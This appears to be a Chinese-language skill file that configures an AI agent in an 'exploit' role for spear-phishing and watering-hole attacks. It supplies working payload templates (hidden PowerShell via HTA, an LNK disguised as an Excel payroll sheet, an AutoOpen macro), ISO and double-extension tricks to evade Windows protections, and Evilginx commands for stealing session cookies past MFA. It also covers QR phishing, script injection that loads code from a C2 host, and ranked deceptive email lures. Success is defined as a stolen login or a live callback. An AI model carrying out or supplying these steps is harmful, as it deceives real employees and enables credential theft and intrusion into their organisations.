---
name: phishing-delivery
description: 鱼叉投递与水坑：邮件钓鱼模板、HTA/LNK/宏载荷、OAuth 钓鱼（AiTM）、二维码钓鱼、水坑页克隆与 JS 注入、域名与发信基建
whenToUse: 打点无可用外部漏洞时走人;需要拿到初始凭据或初始代码执行;目标是拿到办公网第一台权限
role: exploit
enabled: true
---

# 鱼叉投递与水坑(初始访问)

两条产物线:**凭据**(AiTM 钓到账密+session)或**执行**(载荷落地)。
**红线:钓到的凭据能用它登录成功一次 / 载荷回连出会话**——不是"邮件发出去了"。

## 一、基建(发信与域名)

```bash
# 基础域名策略:形似(域名变体 rn/m→m、-s、cn 后缀)、新注册+ SPF/DKIM/DMARC 配齐
# 发信:GoPhish(自建,控制打开率统计)
docker run -p 3333:3333 gophish/gophish
# 或 SMTP 中转:企业邮局账号 / SendGrid 类 API(到达率高于自建)
```
- 邮件头健康:dmarc=pass、无 URL 黑名单(先 virustotal 自测)
- 短链/追踪:自建短链服务(Cloak)+ 每目标独立 URL(定位谁点了)

## 二、载荷形态(点开即执行)

### HTA(最通用)
```html
<script language="VBScript">
CreateObject("Wscript.Shell").Run "powershell -enc <b64>", 0, False
</script>
```
### LNK(快捷方式,带图标迷惑)
```powershell
$s=(New-Object -ComObject WScript.Shell).CreateShortcut("$env:TMP\工资表.lnk")
$s.TargetPath="powershell";$s.Arguments="-enc <b64>";$s.IconLocation="excel.exe,0";$s.Save()
```
### 宏文档(带诱导条:启用编辑)
```vba
Sub AutoOpen(): Dim x: x = "powershell -enc <b64>"
CreateObject("Wscript.Shell").Run x, 0: End Sub
' 加密宏保护(打开需口令,网关解不了)
```
### ISO/IMG 容器(绕 MOTW)
把 LNK+诱饵打包 iso:Windows 挂载后打开无 Mark-of-the-Web,绕过 SmartScreen 一层。
配合:**双扩展**(pdf.exe 不可行,用 "报价单.pdf            .exe" 空格填充)。

## 三、OAuth/AiTM 钓鱼(拿会话而不是密码)

```bash
# Evilginx2/3(反向代理目标登录页,中间人吃 session cookie)
./evilginx -p ./phishlets
: config domain phish.corp.tk
: phishlets evilginx2/owa corp.tk        # 生成钓鱼链接
# MFA 也拦:代理页把 OTP 一起收掉,拿到 cookie 直接复用
```
- 目标选:OWA/Outlook Web、企业 SSO(Ping/Okta/O365)
- **密码+MFA 双全**的红线判定:复用 cookie 打开目标邮箱成功

### 二维码钓鱼(打移动端)
- 生成目标登录页二维码(内容=evilginx 链接),邮件里放"扫码登录移动端"
- 用户手机扫 → 同样走代理链吃会话

## 四、水坑(目标常去的内网/行业站)

```bash
# 已控目标行业门户/供应链站点后:
<script src="https://<c2>/
chained.js"></script>                    # JS 探测浏览器/插件版本按需给载荷
# CVE 浏览器链:Chrome 0day 打点(配合 evasion 的 shellcode)
```
- 供给面:目标供应商门户、内部 Wiki(Jira/Confluence 公网未修版打完当水坑)

## 五、话术模板(命中率排序)

1. IT 通知:"邮箱迁移,2 小时内未验证将停用"(钓凭据,AiTM 链接)
2. 财务:"11 月报销明细核对"(附件 iso)
3. HR:"调整后的组织架构"(密码保护文档,密码写在邮件里→宏)
4. 供应链:"发票/合同系统改版"(水印 pdf + 链接)

## 红线(完成判定)
- 凭据线:AiTM 收到 cookie 且登录成功(记录哪个账号)
- 执行线:会话上线(c2-persistence 记档)
- 未命中的目标记录(点了没执行/没点),给二轮话术参考

## 衔接
- 拿到凭据 → browser-automation 真实登录落权限
- 拿到执行 → shell-handler → privesc-workshop
- 内网起步 → fscan-intranet / ad-domain-attack
